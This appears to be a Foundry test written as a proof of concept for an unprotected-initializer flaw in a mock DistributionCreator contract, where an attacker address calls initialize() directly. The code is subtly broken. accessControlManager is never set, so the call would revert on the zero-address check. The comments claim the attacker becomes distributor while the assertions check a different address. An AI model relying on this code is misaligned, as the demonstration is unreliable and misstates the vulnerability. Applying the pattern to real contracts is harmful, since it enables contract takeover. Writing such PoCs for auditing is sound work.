// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IAccessControlManager {
    // Mock interface for AccessControlManager
}

contract DistributionCreator {
    address public distributor;
    IAccessControlManager public accessControlManager;
    uint256 public defaultFees;
    uint256 constant BASE_9 = 1e9;

    function initialize(IAccessControlManager _accessControlManager, address _distributor, uint256 _fees) external {
        require(address(_accessControlManager) != address(0) && _distributor != address(0), "ZeroAddress");
        require(_fees < BASE_9, "InvalidParam");
        distributor = _distributor;
        accessControlManager = _accessControlManager;
        defaultFees = _fees;
    }
}

contract ExploitTest is Test {
    DistributionCreator distributionCreator;
    address attacker = address(0xdeadbeef);
    address distributor = address(0x1234);
    IAccessControlManager accessControlManager;

    function setUp() public {
        // Deploy the vulnerable contract
        distributionCreator = new DistributionCreator();

        // Fund the attacker with some ETH for gas
        vm.deal(attacker, 1 ether);
    }

    function test_exploit() public {
        // Step 1: Attacker impersonates themselves
        vm.prank(attacker);

        // Step 2: Attacker directly initializes the implementation contract
        distributionCreator.initialize(accessControlManager, distributor, 100);

        // Assert the vulnerability
        // Check if the attacker has set themselves as the distributor
        assertEq(distributionCreator.distributor(), distributor);
        assertEq(address(distributionCreator.accessControlManager()), address(accessControlManager));
        assertEq(distributionCreator.defaultFees(), 100);
    }
}